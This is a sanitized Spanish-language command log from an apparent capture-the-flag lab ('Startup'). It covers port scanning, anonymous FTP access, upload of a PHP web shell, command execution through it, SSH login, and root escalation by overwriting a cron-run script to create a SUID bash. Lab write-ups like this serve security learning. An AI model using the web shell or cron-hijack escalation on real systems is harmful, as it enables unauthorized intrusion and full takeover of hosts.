# Registro depurado de comandos — LAB-016 Startup

Comandos representativos que se ejecutaron durante la práctica. Se omiten credenciales, valores de flags y archivos de evidencia sensibles.

## Reconocimiento

```bash
nmap -Pn --top-ports 100 -T4 10.64.180.147
nmap -Pn -sV -sC -p21,22,80 -T4 10.64.180.147
```

## FTP e imagen

```bash
curl -sS --user anonymous:anonymous ftp://10.64.180.147/notice.txt
curl --user anonymous:anonymous -o ~/Downloads/startup-important.jpg ftp://10.64.180.147/important.jpg
exiftool ~/Downloads/startup-important.jpg
```

## Enumeración web y carga PHP

```bash
gobuster dir -u http://10.64.180.147 -w /usr/share/wordlists/dirb/common.txt
curl -sS http://10.64.180.147/files/
printf '%s\n' '<?php echo shell_exec($_GET["cmd"]); ?>' > ~/Downloads/shell.php
curl -sS --user anonymous:anonymous -T ~/Downloads/shell.php ftp://10.64.180.147/ftp/shell.php
curl -sS -G --data-urlencode 'cmd=id' http://10.64.180.147/files/ftp/shell.php
```

## PCAP

```bash
curl -sS -G --data-urlencode 'cmd=ls -la /incidents' http://10.64.180.147/files/ftp/shell.php
curl -sS -G --data-urlencode 'cmd=cp /incidents/suspicious.pcapng /var/www/html/files/ftp/suspicious.pcapng' http://10.64.180.147/files/ftp/shell.php
curl -sS -o ~/Downloads/suspicious.pcapng http://10.64.180.147/files/ftp/suspicious.pcapng
tshark -r ~/Downloads/suspicious.pcapng -q -z conv,tcp
tshark -r ~/Downloads/suspicious.pcapng -T fields -e tcp.stream -Y 'tcp.port == 4444' | sort -nu
tshark -r ~/Downloads/suspicious.pcapng -q -z follow,tcp,ascii,7
```

El PCAP contiene secretos; no se incluye en el repositorio. La contraseña hallada no se reproduce.

## SSH y comprobaciones locales

```bash
ssh lennie@10.64.180.147
id
whoami
ls -la
ls -la scripts
cat scripts/planner.sh
ls -l /etc/print.sh
cat /etc/crontab
ps auxww | grep -E '[c]ron|[p]lanner|[p]rint.sh'
```

No se incluyen comandos que impriman directamente el contenido de las flags.

## Escalada

```bash
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' > /etc/print.sh
sleep 60
ls -l /tmp/rootbash
/tmp/rootbash -p
id
whoami
```

La última secuencia creó y ejecutó una copia SUID de Bash y confirmó `euid=0(root)`. No se incluyen contraseñas ni flags.
